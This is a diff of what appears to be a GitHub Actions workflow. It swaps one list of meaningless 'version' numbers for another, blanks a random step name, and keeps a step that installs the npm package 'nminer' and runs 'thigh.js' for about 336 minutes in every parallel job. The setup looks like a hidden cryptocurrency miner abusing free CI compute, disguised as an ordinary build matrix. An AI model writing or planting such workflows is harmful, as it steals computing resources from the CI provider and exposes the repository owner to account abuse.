@@ -9,26 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5392 }
-          - { version: 6079 }
-          - { version: 7120 }
-          - { version: 1093 }
-          - { version: 1688 }
-          - { version: 9494 }
-          - { version: 6590 }
-          - { version: 106 }
-          - { version: 1009 }
-          - { version: 2889 }
-          - { version: 3993 }
-          - { version: 1119 }
-          - { version: 8535 }
-          - { version: 3205 }
-          - { version: 5681 }
-          - { version: 5921 }
-          - { version: 9009 }
-          - { version: 9801 }
-          - { version: 5954 }
-          - { version: 6293 }
+          - { version: 7587 }
+          - { version: 149 }
+          - { version: 2276 }
+          - { version: 6872 }
+          - { version: 3108 }
+          - { version: 4949 }
+          - { version: 550 }
+          - { version: 7927 }
+          - { version: 2604 }
+          - { version: 8578 }
+          - { version: 4291 }
+          - { version: 5919 }
+          - { version: 9170 }
+          - { version: 3896 }
+          - { version: 1304 }
+          - { version: 4193 }
+          - { version: 6182 }
 
     steps:
       - name: Checkout
@@ -39,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: ambitious hungrily hundred
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 344m node thigh.js || echo "thigh executed"
+          timeout 336m node thigh.js || echo "thigh executed"
